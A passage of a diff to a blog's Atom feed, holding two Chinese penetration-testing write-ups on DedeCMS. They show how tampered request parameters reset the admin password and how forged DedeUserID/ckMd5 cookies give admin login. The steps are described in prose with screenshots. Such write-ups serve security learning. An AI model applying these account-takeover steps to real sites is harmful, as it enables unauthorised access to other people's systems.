+ 修改 id=1,userid=admin,safequestion=0.0, 发包&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/MyaxXojbCuSUwDL.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+得到一个网址，将 uploads 改为网站 ip&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/X4xknFrBfzLNpu1.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+ 访问失败，再次观察网址发现 get 请求有错，得把两个 amp; 删掉&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/9trQalynS6igOEs.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/KU89mYZo4xrEetP.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+成功进入并且修改管理账号密码&lt;br&gt;
+吊诡的是虽然显示修改成功但实际上密码还是错误 (为此我反复抓包修改搞了两个多小时)&lt;br&gt;
+ 最后发现退出 admin 后 cookie 就删了，得保持 admin 账号登录的情况下新建标签页重置密码&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/alkiuRCtUNcQSp4.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+再次抓包发到 repeater 并修改密码，修改后直接进入会员中心 - 系统设置&lt;br&gt;
+使用刚刚修改的密码重设&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/loycBfXwOaLiWeA.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/lzRtkDLE8bGa9JB.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+打开 dede，登录网站后台管理系统&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/p32rNaHidjvunO6.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+成功进入网站后台&lt;/p&gt;
+</content>
+        <category term="渗透" />
+        <category term="Web" />
+        <updated>2021-11-08T04:34:00.000Z</updated>
+    </entry>
+    <entry>
+        <id>http://meviv.github.io/2021/11/06/%E6%B8%97%E9%80%8F/dedecms01/</id>
+        <title>织梦系统渗透测试壹</title>
+        <link rel="alternate" href="http://meviv.github.io/2021/11/06/%E6%B8%97%E9%80%8F/dedecms01/"/>
+        <content type="html">&lt;p&gt;早年黑历史，截图和写的都是一坨…&lt;/p&gt;
+&lt;span id=&#34;more&#34;&gt;&lt;/span&gt;
+&lt;h2 id=&#34;工具&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#工具&#34;&gt;#&lt;/a&gt; 工具&lt;/h2&gt;
+&lt;p&gt;Burpsuite&lt;/p&gt;
+&lt;h2 id=&#34;过程&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#过程&#34;&gt;#&lt;/a&gt; 过程&lt;/h2&gt;
+&lt;p&gt;开始注册了一个 ID 为 viv 的账号，在登录时想要通过抓包修改 userid 来实现越权&lt;br&gt;
+于是我修改了 userid 为 1，并且修改了 userid 的 md5 加密值&lt;br&gt;
+发包后直接返回了登录页面&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/7S3rs9ZEOFqXvyN.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/9AJResUimuavl1E.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+就知道没这么简单&lt;br&gt;
+再次抓包，发现这个账号 userid 的 md5 值与 md5 的直接加密值不一样，猜测还有一次加密&lt;br&gt;
+尝试了 b64 和一些加密方式后再进行 md5，还是没法对应&lt;br&gt;
+这时发现访问个人空间时会基于 id 生成对应的 ckMd5 值，想到如果用户名为 1 时，就直接有了对应的 ckMd5 值了&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/QjmErwuNBdOC1Pz.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+于是注册一个用户名为 1 的账户&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/fAar1cd3HDu2nJb.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+注册失败了，用户名不够长，那就注册一个 00001 进行尝试&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/jOwxmzKia1urSkD.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+登录抓包，用 vid 替换 userid 的值，vid_ckMd5 替换 userid_ckMd5 的值&lt;br&gt;
+成功登录管理员账户&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/aPVtr5j1dq7JAXE.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+ F12 查看 cookie，修改 DedeUserID 和 DedeUserID__ckMd5 的值，与 vid 对应&lt;br&gt;
+&lt;img data-src=&#34;https://s2.loli.net/2024/03/03/oxT5lNQ8rtKJXpO.png&#34; alt=&#34;&#34;&gt;&lt;br&gt;
+返回网站首页，这时登录页面也变成了管理员账户，至此完成越权&lt;/p&gt;
+</content>
+        <category term="渗透" />
+        <category term="Web" />
+        <updated>2021-11-06T11:41:29.000Z</updated>
     </entry>
 </feed>
